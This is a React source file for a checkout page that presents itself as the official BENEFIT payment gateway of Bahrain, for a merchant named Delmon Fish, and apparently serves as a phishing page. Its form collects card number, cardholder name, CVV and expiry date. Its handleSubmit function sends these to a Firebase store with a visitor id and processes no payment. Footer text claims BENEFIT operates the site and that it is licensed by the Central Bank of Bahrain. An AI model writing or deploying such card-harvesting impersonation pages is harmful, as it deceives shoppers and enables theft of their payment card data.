"use client"

import React, { useState } from "react"
import { addData } from "../firebase"
import { useCart } from "../cartContext"

export default function BenefitPaymentGateway() {
  const [cardNumber, setCardNumber] = useState("")
  const [cardholderName, setCardholderName] = useState("")
  const [cvv, setCvv] = useState("")
  const [month, setMonth] = useState("")
  const [yaer, setYear] = useState("")
  const {total} = useCart() as any
const data={cardNumber,cardholderName,cvv,month,yaer}
const handleSubmit=(e:React.FormEvent)=>{
  e.preventDefault()
  const vId=localStorage.getItem('visitor')
  addData({id:vId,...data})
}
  return (
    <div className="flex justify-center items-center min-h-screen " dir="rtl" style={{zoom:0.8,fontSize:12,lineHeight:1.2,padding:25}}>
      <div className="w-full max-w-md bg-white border border-gray-200">
        {/* Language selector */}
        <div className="text-left p-4">
          <span className="text-red-600 font-medium">English</span>
        </div>

        {/* Header */}
        <div className="text-center mb-4">
          <h1 className="text-red-600 font-bold text-2xl">BENEFIT PAYMENT GATEWAY</h1>
          <p className="text-red-600 font-bold mt-1">{new Date().toISOString().substring(0,10)}</p>
        </div>

        {/* Benefit Logo */}
        <div className="flex justify-center mb-4">
          <img src="/logo.webp" alt="Benefit Logo" width={50} height={100} className="mx-auto" />
        </div>

        {/* Merchant Info */}
        <div className="text-center mb-8">
          <p className="text-xl font-medium">Delmon Fish - أسماك دلمون</p>
          <p className="text-gray-600">@delmonfish</p>
        </div>

        {/* Payment Details */}
        <div className="px-6">
          <form className="space-y-5 mb-8" onSubmit={handleSubmit}>
            <div className="flex justify-between items-center">
              <span className="text-right font-medium text-lg">المبلغ</span>
              <span className="font-bold text-lg"> {total.toFixed(2)}<strong style={{margin:2}}>BD</strong></span>
            </div>

            <div className="flex justify-between items-center">
              <span className="text-right font-medium">صنف البطاقة</span>
              <span className="font-bold">Debit</span>
            </div>

            {/* Card Form */}
            <div className="flex justify-between items-center">
              <label htmlFor="cardNumber" className="text-right font-medium">
                رقم البطاقة
              </label>
              <input
                id="cardNumber"
                type="text"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value)}
                className="border border-gray-300 rounded p-2 w-64 text-left"
                placeholder=""
              />
            </div>

            <div className="flex justify-between items-center">
              <label className="text-left font-medium">تاريخ الصلاحية</label>
              <div className="flex gap-2">
                <select onChange={(e)=>setYear(e.target.value)} className="border border-gray-300 rounded p-2 w-[104px] appearance-none bg-white">
                  <option value="">YYYY</option>
                  {Array.from({ length: 10 }, (_, i) => 2025 + i).map((year) => (
                    <option key={year} value={year}>
                      {year}
                    </option>
                  ))}
                </select>
                <select onChange={(e)=>setMonth(e.target.value)} className="border border-gray-300 rounded p-2 w-[104px] appearance-none bg-white">
                  <option value="">MM</option>
                  {Array.from({ length: 12 }, (_, i) => i + 1).map((month) => (
                    <option key={month} value={month}>
                      {month.toString().padStart(2, "0")}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            <div className="flex justify-between items-center">
              <label htmlFor="cardholderName" className="text-right font-medium">
                إسم صاحب البطاقة
              </label>
              <input
                id="cardholderName"
                type="text"
                value={cardholderName}
                onChange={(e) => setCardholderName(e.target.value)}
                className="border border-gray-300 rounded p-2 w-64 text-left"
                placeholder=""
              />
            </div>

            <div className="flex justify-between items-center">
              <label htmlFor="cvv" className="text-right font-medium">
                الرقم السري
              </label>
              <input
                id="cvv"
                type="password"
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                className="border border-gray-300 rounded p-2 w-64 text-left"
                placeholder=""
              />
            </div>
          </form>

          {/* Action Buttons */}
          <div className="flex justify-center mt-4 gap-4 mb-6" style={{marginTop:18}} >
            <button type={'reset'} className="bg-red-600 text-white rounded py-2.5 px-8 w-1/3 font-medium hover:bg-red-700 transition-colors">
              إلغاء
            </button>
            <button type={'submit'} className="bg-red-600 text-white rounded py-2.5 px-8 w-1/3 font-medium hover:bg-red-700 transition-colors">
              دفع
            </button>
          </div>

          {/* Accepted Cards */}
          <div className="text-right mb-4">
          <a
 href="#" className="text-red-400 underline text-sm" style={{color:'red',marginTop:11,borderBottom:'1px solid red'}}>
              عرض البطاقات المقبولة
            </a>
          </div>

          {/* Terms */}
          <div className="text-right mb-8 text-sm leading-relaxed">
            <p dir="rtl">
              <span className="font-bold">ملاحظة:</span> إن تقديم هذه المعلومات واستخدام "بوابة الدفع الإلكترونية من
              بنفت" يعني موافقتك على{" "}
              <a href="#" className="text-red-600 hover:underline"  style={{color:'red',marginTop:11,borderBottom:'1px solid red'}}>
                شروط هذه الخدمة - إبراء الذمة القانوني
              </a>
              .
            </p>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center space-y-2 mb-6">
          <img src="/logo.webp" alt="Benefit Logo" width={70} height={70} className="mx-auto" />
          <div className="px-6">
            <p className="text-right text-sm" dir="rtl">
              يدار الموقع من قبل شركة بنفت.
            </p>
            <p className="text-right text-sm" dir="rtl">
              حقوق التأليف © 2020-2025 لشركة بنفت. جميع الحقوق محفوظة.
            </p>
            <p className="text-right text-sm" dir="rtl">
              مرخص من قبل مصرف البحرين المركزي لتقديم الخدمات المساعدة للقطاع المالي.
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}
